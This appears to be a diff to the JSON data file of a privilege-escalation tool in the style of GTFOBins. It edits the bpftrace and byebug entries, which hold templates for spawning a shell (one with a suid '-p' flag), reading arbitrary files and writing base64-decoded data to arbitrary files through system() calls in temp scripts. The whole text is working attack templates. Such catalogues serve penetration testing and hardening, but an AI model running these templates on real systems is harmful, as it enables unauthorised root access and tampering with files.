@@ -85,7 +85,7 @@
 	{
 		"name": "bpftrace",
 		"shell": {
-			"script": "{command} -c {shell} -e 'END {{{{exit()}}}}'", 
+			"script": "{command} -c {shell} -e 'END {{exit()}}'", 
 			"suid": ["-p"]
 		}
 	},
@@ -119,13 +119,16 @@
 	{
 		"name": "byebug",
 		"shell": {
-			"script": "TF=$(mktemp);echo 'system(\"{shell}\")' > $TF;{command} $TF",
-			"input": "continue\n"
+			"script": "TF=$(mktemp);echo 'system(\"{shell}\")' > $TF;{command}  --no-stop -q $TF",
+			"need": [
+				"--no-stop",
+				"-q"
+			]
 		},
-		"read_file": "TF=$(mktemp);echo 'system(\"cat {lfile}\")' > $TF;{command} $TF",
+		"read_file": "TF=$(mktemp);echo 'system(\"cat {lfile}\")' > $TF;{command}  --no-stop -q $TF",
 		"write_file": {
 			"type": "base64",
-			"payload": "TF=$(mktemp);echo 'system(\"echo {data} | base64 -d > {lfile}\")' > $TF;{command} $TF"
+			"payload": "TF=$(mktemp);echo 'system(\"echo {data} | base64 -d > {lfile}\")' > $TF;{path} --no-stop -q $TF"
 		}
 	},
 	{
